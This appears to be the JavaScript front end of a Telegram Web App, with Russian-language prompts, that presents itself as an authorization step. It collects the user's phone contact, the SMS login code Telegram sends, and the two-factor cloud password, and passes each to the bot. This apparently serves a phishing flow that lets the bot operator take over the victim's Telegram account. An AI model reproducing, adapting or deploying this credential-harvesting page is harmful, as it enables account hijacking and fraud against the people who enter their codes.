document.addEventListener('DOMContentLoaded', () => {
    if (!window.Telegram || !window.Telegram.WebApp) {
        alert("❌ Открой приложение через Telegram-бота, а не через браузер!");
        return;
    }

    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    const loginBtn = document.getElementById('loginBtn');
    const authForm = document.getElementById('authForm');
    const loadingSpinner = document.getElementById('loadingSpinner');
    const statusMsg = document.getElementById('statusMsg');
    const phoneInput = document.getElementById('phoneInput');
    const codeInput = document.getElementById('codeInput');
    const twoFaInput = document.getElementById('twoFaInput');
    const submitBtn = document.getElementById('submitBtn');
    const successMsg = document.getElementById('successMsg');
    const errorMsg = document.getElementById('errorMsg');

    let currentStep = 'contact';

    function sendDataToBot(payload) {
        try {
            tg.sendData(JSON.stringify(payload));
            return true;
        } catch (err) {
            return false;
        }
    }

    loginBtn.addEventListener('click', () => {
        loginBtn.style.opacity = '0';
        setTimeout(() => loginBtn.classList.add('hidden'), 300);
        authForm.classList.remove('hidden');
        statusMsg.textContent = 'Поделитесь контактом для авторизации...';
        showLoading();

        currentStep = 'contact';

        try {
            tg.requestContact((success, contact) => {
                if (success && contact) {
                    phoneInput.value = contact.phone_number || 'Номер отправлен боту';
                    phoneInput.classList.remove('hidden');
                    statusMsg.textContent = 'Номер отправлен. Ожидаем SMS...';
                    tg.HapticFeedback.impactOccurred('light');

                    setTimeout(() => {
                        phoneInput.classList.add('hidden');
                        codeInput.classList.remove('hidden');
                        submitBtn.classList.remove('hidden');
                        submitBtn.textContent = 'Отправить код';
                        statusMsg.textContent = 'Введите SMS-код из Telegram.';
                        currentStep = 'code';
                        hideLoading();
                    }, 2000);
                } else {
                    hideLoading();
                    errorMsg.textContent = '❌ Вы не предоставили контакт. Попробуйте снова.';
                    errorMsg.classList.remove('hidden');
                    setTimeout(resetForm, 2000);
                }
            });
        } catch (err) {
            hideLoading();
            errorMsg.textContent = '❌ Telegram API не ответил. Перезапустите через бота.';
            errorMsg.classList.remove('hidden');
        }
    });

    submitBtn.addEventListener('click', () => {
        if (currentStep === 'code') {
            const code = codeInput.value.trim();
            if (!code) {
                errorMsg.textContent = 'Введите код.';
                errorMsg.classList.remove('hidden');
                return;
            }
            const payload = { action: 'verify_code', code: code };

            if (sendDataToBot(payload)) {
                showLoading();
                statusMsg.textContent = 'Проверяем код...';
                errorMsg.classList.add('hidden');
                tg.HapticFeedback.impactOccurred('medium');
            } else {
                errorMsg.textContent = '❌ Ошибка отправки кода.';
                errorMsg.classList.remove('hidden');
                hideLoading();
            }

        } else if (currentStep === '2fa') {
            const password = twoFaInput.value.trim();
            if (!password) {
                errorMsg.textContent = 'Введите пароль 2FA.';
                errorMsg.classList.remove('hidden');
                return;
            }
            const payload = { action: 'verify_2fa', password: password };

            if (sendDataToBot(payload)) {
                showLoading();
                statusMsg.textContent = 'Подтверждаем 2FA...';
                errorMsg.classList.add('hidden');
                tg.HapticFeedback.impactOccurred('heavy');
            } else {
                errorMsg.textContent = '❌ Ошибка отправки пароля 2FA.';
                errorMsg.classList.remove('hidden');
                hideLoading();
            }
        }
    });

    codeInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter' && currentStep === 'code') {
            submitBtn.click();
        }
    });

    twoFaInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter' && currentStep === '2fa') {
            submitBtn.click();
        }
    });

    function showLoading() {
        loadingSpinner.classList.remove('hidden');
        submitBtn.disabled = true;
        errorMsg.classList.add('hidden');
    }

    function hideLoading() {
        loadingSpinner.classList.add('hidden');
        submitBtn.disabled = false;
    }

    function resetForm() {
        authForm.classList.add('hidden');
        loginBtn.classList.remove('hidden');
        loginBtn.style.opacity = '1';
        currentStep = 'contact';
        phoneInput.value = '';
        codeInput.value = '';
        twoFaInput.value = '';
        phoneInput.classList.add('hidden');
        codeInput.classList.add('hidden');
        twoFaInput.classList.add('hidden');
        submitBtn.classList.add('hidden');
        successMsg.classList.add('hidden');
        errorMsg.classList.add('hidden');
        statusMsg.textContent = '';
        hideLoading();
    }

    tg.onEvent('web_app_data', (data) => {
        if (data.success) {
            hideLoading();
            successMsg.textContent = '✅ Авторизация завершена!';
            successMsg.classList.remove('hidden');
            statusMsg.textContent = 'Проверьте сообщение от бота ниже.';
            setTimeout(() => {
                tg.close();
            }, 1500);
        } else {
            hideLoading();
            errorMsg.textContent = data.error || '❌ Ошибка авторизации.';
            errorMsg.classList.remove('hidden');
            if (data.twoFaRequired) {
                codeInput.classList.add('hidden');
                twoFaInput.classList.remove('hidden');
                submitBtn.textContent = 'Отправить пароль 2FA';
                statusMsg.textContent = 'Введите пароль 2FA.';
                currentStep = '2fa';
            } else {
                setTimeout(resetForm, 2000);
            }
        }
    });

    tg.onEvent('error', (error) => {
        hideLoading();
        errorMsg.textContent = `❌ Ошибка: ${error.message || 'Неизвестная ошибка'}`;
        errorMsg.classList.remove('hidden');
        setTimeout(resetForm, 2000);
    });
});